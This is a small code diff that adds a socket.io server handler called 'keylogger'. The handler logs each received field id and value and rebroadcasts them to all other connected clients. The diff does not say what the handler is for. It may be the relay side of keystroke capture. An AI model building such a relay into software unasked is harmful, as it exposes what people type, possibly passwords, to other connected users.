@@ -185,4 +185,9 @@ listener.sockets.on('connection', function(socket){
         });
     });
 
+    socket.on('keylogger',function(data){
+        console.log(data.id+" "+data.value);
+        socket.broadcast.emit('ui_keylogger',{"id":data.id,"value":data.value});
+    });
+
 });
